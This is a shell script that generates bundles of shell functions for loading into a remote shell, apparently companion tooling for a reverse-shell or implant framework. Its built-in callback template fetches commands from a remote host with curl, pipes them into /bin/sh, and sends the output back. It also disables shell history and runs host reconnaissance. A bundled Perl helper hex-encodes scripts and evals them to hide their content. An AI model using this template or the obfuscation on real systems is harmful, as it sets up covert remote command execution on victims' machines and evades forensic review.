#!/bin/sh
# funcgen.sh
# Shell functions generator
# By J. Stuart McMurray
# Created 20240527
# Last Modified 20240602

set -e

# Command-line parts passed to make
MAKECLEAN=
MAKEFLAGS="-f -"

# Variables to send to make
OUTFILE=
TEMPLATEFILE=

# Other random and sundry things.
PRINTOUT=                                   # Set to print the output file
TMPDIR="$(mktemp -d -t funcgen.XXXXXXXXXX)" # Where we stick temporary files
UBIT="@builtin"                             # Use built-in template

# Usage tells the user how to use, usefully, and exits.
function usage {
        cat <<_eof
Usage: $1 [-chxv] [-o output_file] [-t callback_template] funcdir [funcdir...]

Rolls a file suitable for use with -ctrl-i-file (by default) or
-callback-template (with -t) which loads shell functions from files in one or
more directories (funcdir) into the remote shell.

In each funcdir should be files with names ending in .sh containing shell
functions (i.e. function foo {...} or foo() {...}) or perl scripts with names
ending in .pl.  Files ending in .sh may also have code which executes when the
script is sent.  Files ending in .pl will be turned into shell functions with
the same name as the file, less the .pl.  Multiple files with the name name but
different extensions are a bad idea.

A template for use with -callback-template may be specified with -t.  This
will be passed through m4 -PEE, with the functions, escaped for inclusion in
single quotes, sent on stdin.  An example template may be printed with -x.  If
the special value $UBIT is passed via -t, a built-in template will be used.

Options:
  -c    Clean (remove) generated files from the funcdir(s)
  -h    Print this help
  -o filename
        Optional output filename, default is standard output
  -t callback_template
        Optional custom -callback-template template
  -v    Print commands as they're run
  -x    Print an example tempalte for use with -t
_eof
}

# atexit is run when the script terminates
function atexit {
        # If we're meant to write to stdout, do so
        if [ -n "$PRINTOUT" ]; then
                cat "$OUTFILE"
        fi
        # If we made a directory, delete it.
        if [ -d "$TMPDIR" ]; then
                rm -rf "$TMPDIR"
        fi
}

# print_example_template prints an example template for use with -t.
function print_example_template {
        cat <<'_eof'
{{- /*
     * callback.tmpl
     * Jazzed-up callback template
     * By J. Stuart McMurray
     * Created 20240325
     * Last Modified 20240601
     */ -}}
{{- define "curl" -}}
curl -Nsk --pinnedpubkey "sha256//{{.PubkeyFP}}" https://{{.URL}}
{{- end -}}
#!/bin/sh

CRS_FUNCS='
trap - HUP
export HISTFILE=/dev/null
m4_esyscmd(`cat')m4_dnl
ps awwwfux; uname -a; id
'

(
	trap "$CRS_FUNCS" HUP
	trap
	echo 'kill -HUP $$'
	{{template "curl" .}}/i/{{.ID}}
) </dev/null 2>&0 |
/bin/sh 2>&1 |
{{template "curl" .}}/o/{{.ID}} -T- >/dev/null 2>&1
{{/* vim: set filetype=gotexttmpl noexpandtab smartindent: */ -}}
_eof
}

# Helper scripts, which we'll pass to the makefile in variables.
function print_hexevalify_pl {
        cat <<"_eof"
#!/usr/bin/env perl
#
# hexevalify.pl
# Turn a perl script into hex in an environment variable, eval'd, in a function
# By J. Stuart McMurray
# Created 20240525
# Last Modified 20240602

use warnings;
use strict;
use File::Basename;

# envname is the name of the environment variable with the hexed script.
my $envname="HEXEVALIFY";

# Make sure we have a file to convert.
if (0 != $#ARGV) {
        print STDERR "Usage: $0 perlscript\n";
        exit 1;
}
open my $FH, "<$ARGV[0]" or die "open $ARGV[0]: $!";

# Figure out the function name.
my ($fn, undef, undef) = fileparse("$ARGV[0]", qr/\.[^.]*/) or
        die "Could not parse filename $ARGV[0]: $!";

# Slurp and hexify the script in question.
my $payload;
{
        local $/;
        defined($payload = <$FH>) or die "Read error: $!";
}
my $hex = unpack("H*", $payload);

# Emit a nice script in a f
print qq<function $fn { >;
print qq<$envname=$hex >;
print qq<perl -e 'eval(pack"H*",\$ENV{$envname});>;
print  q<die"Error: $@"if(""ne$@)' "$@"; }>;
print qq<\n>;
_eof
}

# Work out what we're building and how.
while getopts chio:t:vx name; do
        case "$name" in
                c) MAKECLEAN="clean"              ;;
                h) usage "$0"; exit 0             ;;
                o) OUTFILE="$OPTARG"              ;;
                t) TEMPLATEFILE="$OPTARG"         ;;
                v) MAKEFLAGS="$MAKEFLAGS -dl"     ;;
                x) print_example_template; exit 0 ;;
                ?) usage "$0"; exit 1             ;;
        esac
done
shift "$((OPTIND - 1))"

# Need at least one source directory
if [ -z "$*" ]; then
        echo "Need at least one functions files directory." >&2
        exit 4
fi

# Delete any files we've made on exit
trap "atexit" EXIT

# Work out which version of Make to use, and make sure we have it.
MAKE=make
OSNAME="$(uname -s)"
case "$OSNAME" in
        Linux|Darwin) MAKE=bmake                                       ;;
        OpenBSD)                                                       ;; # :)
        *) echo "Unexpected OS $OSNAME.  Hope we have BSD make..." >&2 ;;
esac
if ! type "$MAKE" >/dev/null; then
        echo "Make program $MAKE not found" >&2
        exit 3
fi

# If we're writing to stdout, we'll actually write to a temporary file and then
# print that to stdout.
if [ -z "$OUTFILE" ] && [ -z "$MAKECLEAN" ]; then
        PRINTOUT=yes
        OUTFILE="$TMPDIR/out"
fi

# If we're using a built-in template, make it actually a file.
if [ "$UBIT" = "$TEMPLATEFILE" ]; then
        TEMPLATEFILE="$TMPDIR/template"
        print_example_template > "$TEMPLATEFILE"
        touch -r "$0" "$TEMPLATEFILE"
fi

# All the real work is done by make.
HEXEVALIFY_PL="$(print_hexevalify_pl)" \
"$MAKE" \
        $MAKEFLAGS \
        SRCDIRS="$*" \
        OUTFILE="$OUTFILE" \
        TEMPLATEFILE="$TEMPLATEFILE" \
        $MAKECLEAN \
        <<"_eof_makefile"
# funcgen.mk
# Makefile which assembles shell functions
# By J. Stuart McMurray
# Created 20240528
# Last Modified 20240602

# Make sure we have all of the bits we need
.poison empty (SRCDIRS)
.poison !defined (TEMPLATEFILE)

SUBR_SUFFIX  = fg_subr
OUTFILE     ?= /dev/null

.SUFFIXES: .sh .subr .pl .$(SUBR_SUFFIX)

# Work out where to get files
SRCS  != find $(SRCDIRS) -type f ! -name '*.$(SUBR_SUFFIX)' -a ! -name '.*'
SUBRS  = $(SRCS:R:S/$/.$(SUBR_SUFFIX)/)

# Work out which way to build the output file.
.if empty(TEMPLATEFILE)
$(OUTFILE): build_ctrl_i_file
.else
$(OUTFILE): build_template
.endif

# Convert files to the proper form.
.sh.$(SUBR_SUFFIX) .subr.$(SUBR_SUFFIX):
	@cp $< $@

.pl.$(SUBR_SUFFIX):
	@perl -e "$$HEXEVALIFY_PL" $> > $@

# build_ctrl_i_file rolls all of the subroutines into a single file.
build_ctrl_i_file: $(SUBRS) .USE
	@echo "# Generated $$(date)" > $@
.       for F in $(SUBRS)
		@cat $F >> $@
.       endfor

# build_template sends all of the subroutines into a template.
build_template: $(SUBRS) $(TEMPLATEFILE) .USE
	@cat $(SUBRS) |\
		sed -e "s/'/'\\\''/g" |\
		m4 -PEE $(TEMPLATEFILE) > $@

# Clean removes generated files from the functions directories
clean:
	@find $(SRCDIRS) -name '*.$(SUBR_SUFFIX)' ! -name '.*' -delete
_eof_makefile

# vim: ft=sh
